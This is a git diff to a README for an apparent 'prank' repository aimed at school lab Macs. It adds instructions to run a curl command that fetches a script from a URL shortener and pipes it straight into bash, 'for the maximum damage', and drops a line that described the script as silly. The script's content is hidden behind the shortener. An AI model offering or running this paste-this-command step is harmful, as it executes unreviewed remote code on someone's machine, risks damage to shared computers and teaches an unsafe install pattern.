@@ -1,5 +1,9 @@
 # It-s-just-a-prank-bro
-Silly script for intra macs to have a good laugh.
 
+make sure to maximize the visual studio window and run it in vs code terminal for the maximum damage.
 
+Simply run this command :
+
+```
 curl -L http://gg.gg/Rambeau | bash
+```
